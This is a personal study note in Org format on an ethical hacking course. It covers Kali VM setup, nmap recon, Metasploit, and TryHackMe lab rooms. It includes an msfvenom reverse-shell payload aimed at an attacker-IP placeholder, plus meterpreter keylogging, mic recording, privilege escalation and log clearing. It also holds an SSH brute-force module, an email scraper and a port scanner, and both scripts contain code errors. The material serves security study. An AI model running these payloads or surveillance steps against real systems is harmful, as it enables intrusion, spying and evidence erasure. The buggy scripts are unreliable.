:PROPERTIES:
:ID:       99d15265-b718-4ec1-b986-427b41696cbb
:END:
#+title: [Udemy] Ethical Hacking Bootcamp
#+date: [2022-06-22 qua 17:30]

* Introduction

+ *Course:* Complete Ethical Hacking Bootcamp 2022: Zero to Mastery.

Skills are valuable when they are hard to get. So, get your hands dirty and
start exploring complex things.

* Virtual Machine

During the course, the instructor use VirtualBox to create Virtual Machines
using the bare metal image from Kali Linux. *He does not use some already made
VM image*.

** VM configuration

| Image     | Kali Linux Bare Metal (Debian based) |
| RAM       | 2 GiB                                |
| Hard disk | 30 GiB                               |

+ Graphical install
+ English language
+ Keyboard: brazilian
+ Hostname: kali
+ Domain name: (empty)
+ User: mrhacker
+ Password: mrhack3r
+ Package manager: (empty)
+ Software selection:
  - Desktop environment
  - ...Xfce
  - Collection of tools
  - ...top10
  - ...default
  - ...large

GRUB boot loader is a software to load Linux system.

** Post-Installation

+ https://www.ceos3c.com/security/top-things-after-installing-kali-linux/

* QEMU
** Introduction

From QEMU docs we find that QEMU is a generic and open source machine emulator
and virtualizer, that is commonly used for "system emulation", where it provides
a virtual model of an entire machine (CPU, memory and emulated devices) to run a
guest OS.

*** Glossary

+ *Device Front End*:

  Is how a device is presented to the guest. The type of device presented should
  match the hardware that the guest operating system is expecting to see.

  A front end if often paired with a back end, which describes how the host's
  resources are used in the emulation.

+ *Device Buses*:

  Most devices will exist on a BUS of some sort. Depending on the machine model
  you choose (-M foo) a number of buses will have been automatically created. In
  most cases the BUS a device is attached to can be inferred, for example PCI
  devices are generally automatically allocated to the next free address of
  first PCI bus found. However in complicated configurations you can explicitly
  specify what bus (bus=ID) a device is attached to along with its address
  (addr=N).

+ *Device Back End*:

  The back end describes how the data from the emulated device will be processed
  by QEMU.

+ *Device Pass Through*:

  Is where the device is actually given access to the underlying hardware.

** Installation and Usage

#+BEGIN_SRC bash
  # Ubuntu installation:
  # ----------------------------------------------------------------------
  #
  # qemu-kvm - software que fornece emulação de hardware para o KVM.
  # libvirt-daemon-system - arquivos de configuração para executar o daemon
  #   libvirt como um serviço do sistema.
  # libvirt-clients - software para gerenciar plataformas de virtualização,
  #   antigamente instalável pelo pacote libvirt-bin que teve seu nome
  #   alterado.
  # bridge-utils - um conjunto de ferramentas de linha de comando para
  #   configurar Ethernet.
  # virtinst - um conjunto de ferramentas de linha de comando para criação
  #   de máquinas virtuais.
  # virt-manager - uma interface GUI fácil de usar e utilitários de linha de
  #   comando de suporte para gerenciar máquinas virtuais por meio de libvirt.
  #
  # install required packages
  sudo apt install qemu-kvm \
       libvirt-daemon-system \
       libvirt-clients \
       bridge-utils \
       virtinst \
       virt-manager
  #
  # check the daemon is running
  sudo systemctl is-active libvirtd
  # if not active:
  # sudo systemctl enable libvirtd
  #
  # check the groups you're within
  groups $USER
  # you're added automatically to the libvirt group
  # make sure to get inside the kvm group as well
  sudo usermod -aG kvm $USER
  #
  # go for the applications search program
  # search for `virtual machine manager`
  # it will open a cool UI for you to configure further options
  # ...
  #
  # list virtual OS running
  virsh -c qemu:///system list
#+END_SRC

*** Create a VM using the Terminal

#+BEGIN_SRC bash
  cd ~/Desktop

  # create the virtual machine
  qemu-img create -f qcow2 <IMAGE_NAME> <STORAGE_SPACE>G
  # qemu-img create -f qcow2 kali-linux.img 20G

  qemu-system-x86_64 -m 2048 -boot d -enable-kvm -smp 2 \
                     -net nic -net user -hda kali-linux.img \
                     -cdrom kali-linux-2022.2-installer-amd64.iso
  # -m 2048: RAM memory
  # -boot -d: A opção de inicialização que nos permite especificar a ordem
  #           de inicialização, qual dispositivo será iniciado primeiro.
  # -enable-kvm: Permite usar a tecnologia KVM para emular a arquitetura que
  #              que desejamos. Sem ele, o QEMU usuará a renderização por
  #              software, que é muito lenta.
  # -smp 2: Quantidade de núcleos que vamos usar.
  # -net nic -net user: Permitir uma conexão Ethernet com a Internet na VM
  #                     em execução por padrão.
  # -hda kali-linux.img: Caminho para o disco rígido que será usado.
  # -cdrom kali-linux-2022.2-installer-amd64.iso: Inicializar o nosso arquivo
  #                                               ISO.

  # After installing the ISO, you can run the VM with this command:
  qemu-system-x86_64 -m 2048 -boot d -enable-kvm -smp 2 \
                     -net nic -net user -hda kali-linux.img
#+END_SRC

*** Keyboard commands

+ /C-M-g/ -> free the mouse from inside the image.
+ /C-M-f/ -> toggle switch fullscreen.

** References

+ [[https://www.youtube.com/watch?v=p09vXPhglF4&ab_channel=TerminalRoot][[Youtube] Como instalar o QEMU/KVM no Linux Mint, Ubuntu e outras Distros]]
+ [[https://www.qemu.org/docs/master/about/index.html][QEMU docs]]
+ [[https://www.kali.org/docs/virtualization/install-qemu-guest-vm/][Kali docs - Kali inside QEMU/LibVirt with virt-manager (Guest VM)]]
+ [[https://terminalroot.com.br/2021/02/como-instalar-o-qemu-kvm-no-linux-mint-ubuntu-e-outras-distros.html][[Blog] Terminal root: como instalar o QEMU, ...]]

* Penetration Test Methodology

** Information Gathering/Reconnaissance:

Collect useful information about our target.

Start the process getting the target IP addresses. Later we could try to get
e-mails, phone numbers and the technologies they use internally.

#+BEGIN_SRC bash
  ping <DOMAIN>
  # ping facebook.com

  nslookup <DOMAIN>
  # nslookup facebook.com

  whois <DOMAIN>
  # whois facebook.com
#+END_SRC

One can check the ~ipinfo.info~ URL to get more information related to some
domain.
   
** Scanning

Scanning is basically the same process as reconnaissance, but searching for more
details and information. This part of the methology is not available for all the
targets, so we'll need to scan only pre-defined VMs in available sites where we
have permission.

In this phase we're interested in *open ports* mainly, so we can start exploring
services listening in those ports.

Common ports:

+ Port 80 & 443 -> HTTP and HTTPS;
+ Port 21 -> FTP;
+ Port 22 -> SSH;
+ Port 53 -> DNS;
+ Port 25 -> SMTP;

*** Finding Vulnerable Machines

The process presented in the course to find vulnerable machines is basically
googling "top 10 vulnerable machines".

You can use the following command to scan your local network:

#+begin_src bash :tangle no
  sudo netdiscover

  # discover the router IP
  netstat -nr
#+end_src

*** Tool: nmap

*nmap* is the most used tool for network scanning and penetration tests. It is
used to map the network configuration, discover hosts and devices in a computer
network.

#+begin_src bash :tangle no
  # use this command to scan a network
  nmap <IP/MASK>
#+end_src

**** TCP Syn scan

In order to make the scanning operation fast, there is a mode of nmap that only
sends the syn frame and wait for the syn-ack. It does not send the final paket.

This scanning technique does less noise in the target machine, so it's harder to
detect it.

#+begin_src bash :tangle no
  # require sudo since we are changing the network default operation
  sudo nmap -sS <IP>
#+end_src

**** Manual

#+begin_src bash :tangle no
  man nmap
#+end_src

*** Describe Target OS

#+begin_src bash :tangle no
  sudo nmap -O <IP>
#+end_src

*** Detecting Version of Service Running on an Open Port

#+begin_src bash :tangle no
  sudo nmap -sV <IP>
#+end_src

** Vulnerability Analysis

The best vulnerability analysis you can do is to google the results of the scan
phase. Tools' database of vulnerabilities are commonly not updated.

*** nmap Scripting

nmap can run vulnerability analysis and exploitation depending on the script it
is running.

+ https://nmap.org/book/nse-usage.html

With this configuration we can even start exploring those known vulnerabilities.

*** Nessus

Nessus e a paid tool with a free limited option used to scan and detect
vulnerabilities.

** Gaining Access/Exploitation

Main information gathered from the previous step:

- Open and closed ports;
- Services running in those ports and their versions;
- Operating system the target is running;
- Scan for known vulneratibilities whether the target has known issues or bugs;

Now, in this step, we'll use this information combined to get access to the
target and execute what we want there.

*** Reverse shell

Shell is our access to the target machine. You can think of it as the terminal
we use to run commands.

Reverse shell is when we run a command in the target machine to make it connect
to our own machine, leaving us with a terminal to access it.

This is a better option than bind shells due to the firewall block operations.

*** Bind shell

Bind shell is a different approach where we connect to the target machine when
its port is open executing some vulnerable service. This approach is more hard
to explore in the wild since firewalls are commonly configure to avoid it.

*** Metasploit Framework Structure

This tools is probably the most used in this phase to exploit different targets
and their vulnerabilities. It offers thousands of exploits that we can use for
both Linux, Windows and MacOS systems.

You can find the metasploit directory by using:

#+begin_src bash
  cd /usr/share/metasploit-framework/
#+end_src

Exploits are a sequence of commands executed with the intention to attack the
target specific vulnerabilities in a system or application. It is commonly used
to provide access to the environment of the system with high permissions.

+ All the modules of the Metasploit Framework are written in *Ruby* language.

**** Modules

#+begin_src bash
  cd /usr/share/metasploit-framework/modules/
#+end_src

+ Exploits: code we can use to attack the target.
+ Auxiliary: programs we can use to attack specific parts of the system, like
  the printer, the DNS server, etc.
+ Post: programs we use after the attack has finished.
+ Payload: code we deliver to the target in order to control its machine.
+ Encoders: avoid antivirus detection.
+ Evasion: do the same thing basically ^. They are used for Windows Defender.
+ Nops: instruction for the processor to do nothing. It's useful for buffer
  overflow attacks. Stands for *no-operations*.

**** Run

#+begin_src bash
  # run this in the terminal
  msfconsole

  # use `help` to list the possible commands
  # in this terminal we can keep using other normal Linux commands
  # ls, cd, etc.

  show payloads
  show exploits
  use <MODULE_NAME>/<NAME_OF_EXPLOIT>
  # use exploit/windows/smb/ms06_040_netapi
  # multi means that it can be used for several OS

  show info
  show options # the most important part
  # use this command to set exploit configurations
  # example of configuration:
  # set LHOST 129.168.1.15
  show targets
  # list possible targets for this exploit
  set target <NUMBER>
  # set target 3
  exploit # start the attack

  # you can search exploits from metasploit using this command
  # search <SERVICE_NAME>
  # example: search vsftpd
#+end_src

*** nc

netcat is a tool we can use to create bind shell connections. We can use it to
connect to external servers using the network.

#+begin_src bash
  nc <IP> <PORT>
  # nc 192.168.1.5 1524
#+end_src

*** Information disclosure

Information disclosure, also known as information leakage, is when a website
unintentionally reveals sensitive information to its users. Depending on the
context, websites may leak all kinds of information to a potential attacker

Always check for the default credentials first.

*** searchsploit

This command must be used to search for available sploits for a defined service
in a specific version.

#+begin_src bash
  searchsploit <SERVICE> <VERSION>
  # searchsploit Samba 3.0.20
#+end_src

*** Bruteforce SSH

Bruteforce attacks is a strategy to test many combinations of authentication
data to access a service. We can use it check for default authentication
settings.

#+begin_src bash
  msfconsole
  use auxiliary/scanner/ssh/ssh_login
  show options
  # set required values
  sessions
  # list the sessions succeeded
  sessions -i 1
  # you can go with the common way instead
  # ssh <USER>@<IP>
#+end_src

*** Windows Exploit: Eternalblue

This exploit was used in a massive attack to release the *wannacry*
ransomware. It uses the port 445 that is running SMB service in Windows
machines.

**** DoublePulsar

Along with the common *Eternalblue* attack, we can use the *DoublePulsar*
variant, which works better than the common *EternalBlue*. It's not available by
default in the metasploit framework, so you need to install it from Github.

Along with the tools specific for this payload to work, one need to install a
couple of services: Python 2.x.x and Wine.

*** Windows Exploit: BlueKeep

The latest RDP (Remote Desktop Protocol) vulnerability could allow hackers to
remotely run code at the system level without even having to authenticate. In
other words, any unpatched Windows system (from XP to Windows 7) with an exposed
RDP port is a potential target.

Some people classify this exploit in the same level as the EternalBlue one.

This exploit is already available in the metasploit framework.

*** Routers

Routers invasion is pretty important since the person who controls them,
controls the network we use.

In order to explore this environment we're going to use a different tool, named
"Routersploit" that tests for known router exploits and checks for vulnerability
that a lot of routers have!

In order to get the tool we'll use you need to go for the Google and search for
"routersploit". Then, the Github link will pop up.

*** Gaining Access in Targets Without Vulnerabilities

We must deliver the payload to the target and execute it. You must make the
target run a specific program to create the vulnerability for us to attack.

+ There is no clear way of bypassing antiviruses!
+ Create your own payloads.
+ Keep yourself updated with new tools.

**** Msfvenom

If you decide to use some common tool, keep in mind that most firewall software
will have the signature for this payload. In this Udemy course, the instructor
starts showing how to use a tool called ~msfvenom~.

#+begin_src bash
  msfvenom -h

  msfvenom -p windows/x64/meterpreter/reverse_tcp \
           LHOST=<ATTACKER_VM_IP> \
           LPORT=5555 \
           -f exe \
           -o shell.exe
  # this program when executed in the target machine will give us a terminal
  # to attack the target.
  # we can use other flags to encode the payload information.
  # we can also select other payload extensions.
  #
  # we need to configure our host machine to listen to the port that the exploit
  # will try to connect.
  #
  msfconsole
  use exploit/multi/handler # listener
  show options
  set payload windows/x64/meterpreter/reverse_tcp
  set LHOST <LOCAL_IP>
  set LPORT 5555
#+end_src

**** Check Virus Detection

We can use a virtual website to test how many antivirus would catch a possible
exploit one can use the https://www.virustotal.com/gui/home/upload. Keep in mind
that every file that is uploaded to this website will get redirected to
antivirus developers.

**** Veil

This tool is not available by default in Kali Linux. In order to install it you
must run:

#+begin_src bash
  sudo apt-get install veil

  # start the tool
  veil
#+end_src

**** TheFatRat Payload Creation

This is another tool not available by default in the Kali Linux
distribution. It's intend is to automate even more the payload generation for
attackers.

**** Check the hash of a program

#+begin_src bash
  md5sum <SCRIPT>
  # example: md5sum shell.exe
#+end_src

** Maintaining Access (Optional)

Now it's time to understand what to do after we get access to the target system.

The most simple thing to do is to look at the target files, looking for
passwords or some sensitive data. We can do all of this just using the
meterpreter shell using simple commands.

*** Meterpreter shell

#+begin_src bash
  # Considering that we already have access to the target system.
  #
  # Let's check the help command
  help

  # Download file from the target machine
  download <FILE_PATH>

  # Upload file to the target machine
  upload <FILE_PATH>

  # Remove files from target machine
  rm <FILE_PATH>

  # Notice that some of those commands can fail if you're not an administrator.
  #
  # ======================================================
  #
  # Peripherals - Microphone, Keyboard, Screen, Camera
  #
  # We can use the meterpreter to trigger events in peripherals of the target
  # computer.
  keyscan_start # keylogger application
  keyscan_dump
  keyscan_stop

  # Take a screenshot of the target environment.
  screenshot

  # Watch target desktop in real time.
  # This command is a bit buggy because it requires some power to run properly.
  screenshare

  # Record microphone
  record_mic -d 10 # record for 10 seconds

  # Try to scale your privileges in the target machine:
  getsystem

  # Clear your steps
  clearev
#+end_src

**** Privilege Scalation

There are many advanced techniques that could be used to elevate privileges and
this topic is very broad.

** Covering Tracks

* Useful Linux Commands
** Network commands

#+BEGIN_SRC bash
  # check internet configuration
  ifconfig
#+END_SRC
** Miscellaneous

+ https://linuxfoundation.org/blog/classic-sysadmin-the-linux-filesystem-explained/

* Useful Kali Linux Tools

It's useful to have more than one tool in your toolset to do the same task
because eventually one tool will fail, or maybe it is abandoned and does not
receive any new update.

** WhatWeb

This tool is used to discover websites configuration. It presents a bunch of
configuration options. By default it triggers a single request, this is the
level 1 mode for this tool. You can use this mode in any website.

But, if you want to really dig the website, you can use some higher modes, which
are focused in the pentesting job. Make sure to use those modes only in websites
that you have permission.

** theHarvester

This tool is used to gather open source intelligence (OSINT) on a company or
domain. It is good to get e-mails from some company.

#+begin_src bash
  theHarvester --help # get the help options

  theHarvester -d facebook.com -b all
#+end_src

This tool does not work everytime. According to the instructor, somedays this
tool works perfectly, although other days it does not work. You can try using it
many times to get some different result.

*** hunter.io

We can use this site to scan for company websites.

You must create an account to get results without blur. For the free plan we can
make at most 50 requests.

** Sherlock

This tools is not built in with the common Kali Linux toolset. You need to
download it from the Github repository: [[https://github.com/sherlock-project/sherlock][link]]. After download this tool it was
required to install packages from pip3.

Sherlock is used to find accounts from a single person using the same
username. For example:

#+begin_src bash
  # install lacking python packages
  # pip3 install torrequest

  python3 sherlock.py <USERNAME>
  # start scanning several sites to find this username
#+end_src

** email-scraper.py

The instructor shared this script made by himself to scrape e-mails in some
page. It scans for 100 pages by default.

#+begin_src python :tangle no
  from module import symbol
  bs4 import BeautifulSoup
  import requests
  import requests.exceptions
  import urllib.parse
  from collections import deque
  import re

  user_url = str(input('[+] Enter Target URL To Scan: '))
  urls = deque([user_url])

  scraped_urls = set()
  emails = set()

  count = 0
  try:
      while len(urls):
          count += 1
          if count == 100:
              break
          url = urls.popleft()
          scraped_urls.add(url)

          parts = urllib.parse.urlsplit(url)
          base_url = '{0.scheme}://{0.netloc}'.format(parts)

          path = url[:url.rfind('/')+1] if '/' in parts.path else url

          print('[%d] Processing %s' % (count, url))
          try:
              response = requests.get(url)
          except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
              continue

          new_emails = set(re.findall(r"[a-z0-9\.\-+_]+@[a-z0-9\.\-+_]+\.[a-z]+", response.text, re.I))
          emails.update(new_emails)

          soup = BeautifulSoup(response.text, features="lxml")

          for anchor in soup.find_all("a"):
              link = anchor.attrs['href'] if 'href' in anchor.attrs else ''
              if link.startswith('/'):
                  link = base_url + link
              elif not link.startswith('http'):
                  link = path + link
              if not link in urls and not link in scraped_urls:
                  urls.append(link)
  except KeyboardInterrupt:
      print('[-] Closing!')

  for mail in emails:
      print(mail)
#+end_src

During the course there will be classes teaching how to build this kind of tool
with Python 3.

** More tools

By the end of this section of *Reconnaissance & Information Gathering*, there is
a cool article with a link to find more tools to run this task. This way we can
experiment with those and add the best to our toolset.

+ [[https://securitytrails.com/blog/osint-tools][SecurityTrails - OSINT Tools]]

* Firewalls, IDS

Firewalls are used to filter requests to the network, monitoring pakets in real
time. IDS is a system used to detect intrusions. Both are used to make the
network more secure.

We can use ~nmap~ to bypass those security tools.

* Python

According to the instructor, the [[https://docs.python.org/3/library/socket.html][socket library]] will be the most used during the
lessons.

** Port Scanner

#+begin_src python :tangle portscanner.py
  import socket
  import termcolor

  def scan(target, ports):
      print("\n" + " Starting Scan For " + str(target))
      for port in range(1, ports):
          scan_port(targets, port)

  def scan_port(ipaddress, port):
      try:
          sock = socket.socket()
          sock.connect((ipaddress, port))
          print("[+] Port Opened: " + str(port))
          sock.close()
      except:
          # print("[-] Port Closed: " + str(port))
          pass # we don't care for closed ports

  targets = input("[*] Enter Targets To Scan (split them by ,): ")
  ports = int(input("[*] Enter How Many Ports You Want To Scan: "))

  if "," in targets:
      print(termcolor.colored(("[*] Scannning Multiple Targets"), "green"))
      for ip_addr in targets.split(","):
          scan(ip_addr.strip(" "), ports)
  else:
      scan(targets, ports)
#+end_src

#+RESULTS:

* Website Application Testing Theory

Along with the process of attacking a VM through the network, another big sector
of the computer security area is only focused into the safety of web
applications.

** Information Gathering & Dirb Tool

This is the first step when studying some target website. We can use ~dirb~ to
scan for a specific target site. This tool is already available in Kali Linux
distribution.

** BurpSuite

This tool is the most used for web applications attack. It is already available
in Kali Linux distributions (Community version).

** ShellShock Exploitation

This vulnerability, although not common nowadays, was one of the most critical
ever found. Since this vulnerability is almost always patched, the instructor
decided to download a specific ISO from the ~pentesterlab~ to simulate this
vulnerability.

* Complement: TryHackMe

Platform [[https://tryhackme.com/][link]].

We can use this platform to learn reading materials and testing with vulnerable
machines for free (until a limit).

To access those vulnerable VMs we can use either a VPN or the recommended tool,
named AttackBox, which opens a side screen with a complete system that we can
use to run our commands.

** Information Gathering

*** nmap

#+begin_src bash
  nmap -sV <IP> # Attempts to determine the version of the services running
#+end_src

*nmap* is an free, open-source and powerful tool used to discover hosts and
services on a computer network. In our example, we are using nmap to scan this
machine to identify all services that are running on a particular port. nmap has
many capabilities, below is a table summarising some of the functionality it
provides.

*** Locating directories using GoBuster
** Burp Suite: The Basics

+ [[https://tryhackme.com/room/burpsuitebasics][Room link]]

In reality I did not went directly to this room in the beginning. I just went to
it due to a necessity before I was able to advance a different room.

The goals of this room are to cover:

+ What Burp Suite is
+ An overview of the available tools in the framework
+ Installing Burp Suite for yourself
+ Navigating and configuring Burp Suite
+ Introduce the core of the Burp Suite framework: the Burp Proxy

*** What is Burp Suite?

Is a framework written in Java that aims to provide a one-stop-shop for web
application penetration testing. Burp is very much the industry standard tool
for hands-on web app security assessments.

Burp Suite is also very commonly used when assessing mobile applications, as the
same features which make it so attractive for web app testing translate almost
perfectly into testing the APIs (Application Programming Interfaces) powering
most mobile apps.

This tool is available in 3 different plans:

+ Community: Is free, although it is limited;
+ Professional: Expensive but with full capabilities;
+ Enterprise: Used for continuous scanning in servers;

*** How it works?

At the simplest level, Burp can capture and manipulate all of the traffic
between an attacker and a webserver: this is the core of the framework. After
capturing requests, we can choose to send them to various other parts of the
Burp Suite framework.

The Burp Proxy is the most fundamental (and most important!) of the tools
available in Burp Suite. It allows us to capture requests and responses between
ourselves and our target. These can then be manipulated or sent to other tools
for further processing before being allowed to continue to their destination.

*** Features

Whilst Burp Community has a relatively limited feature-set compared to the
Professional edition, it still has many superb tools available. These include:

+ Proxy: The most well-known aspect of Burp Suite, the Burp Proxy allows us to
  intercept and modify requests/responses when interacting with web
  applications.
+ Repeater: The second most well-known Burp feature -- Repeater -- allows us to
  capture, modify, then resend the same request numerous times. This feature can
  be absolutely invaluable, especially when we need to craft a payload through
  trial and error (e.g. in an SQLi -- Structured Query Language Injection) or
  when testing the functionality of an endpoint for flaws.
+ Intruder: Although harshly rate-limited in Burp Community, Intruder allows us
  to spray an endpoint with requests. This is often used for bruteforce attacks
  or to fuzz endpoints.
+ Decoder: Though less-used than the previously mentioned features, Decoder
  still provides a valuable service when transforming data -- either in terms of
  decoding captured information, or encoding a payload prior to sending it to
  the target. Whilst there are other services available to do the same job,
  doing this directly within Burp Suite can be very efficient.
+ Comparer: As the name suggests, Comparer allows us to compare two pieces of
  data at either word or byte level. Again, this is not something that is unique
  to Burp Suite, but being able to send (potentially very large) pieces of data
  directly into a comparison tool with a single keyboard shortcut can speed
  things up considerably.
+ Sequencer: We usually use Sequencer when assessing the randomness of tokens
  such as session cookie values or other supposedly random generated data. If
  the algorithm is not generating secure random values, then this could open up
  some devastating avenues for attack.

In addition to the myriad of in-built features, the Java codebase also makes it
very easy to write extensions to add to the functionality of the Burp framework.

*** Cross-Site Scripting (XSS)

Cross-Site Scripting (or XSS) is injecting a client-side script (usually in
JavaScript) into a webpage in such a way that it executes. There are various
kinds of XSS. Example:

+ Reflected XSS

** Vulnversity

*** Locating directories using GoBuster

When using the gobuster software to brute-force URIs (directories and files),
DNS subdomains and virtual host names, I got a better output when using the
~rockyou.txt~ wordlist. The only bad part is that the process is *very slow*, it
took some minutes until finished scanning.

#+begin_src bash
  gobuster dir -u http:<IP>:3333 -w /usr/share/wordlist/rockyou.txt
  # this file is 136 Mb long
#+end_src

One can find more information about the wordlist presented in Kali Linux by
going for this link: https://www.kali.org/tools/wordlists/.

Since this process was taking much time I decided to use other wordlists. So I
used this other file and got the results faster:

#+begin_src bash
  gobuster dir -u http:<IP>:3333 -w /usr/share/wordlist/dirb/common.txt
#+end_src

*** Compromise the webserver

I had some problems in the task of testing the upload of common file
extensions. For some reason the page was breaking and although it was not
allowing me to upload the majority of files, in the challenge page my answers
were not accepted.

To automate the process of testing this webpage, the tutorial recommends the
usaged of BurpSuite ([[https://tryhackme.com/room/burpsuitebasics][TryHackMe BurpSuite room]]).
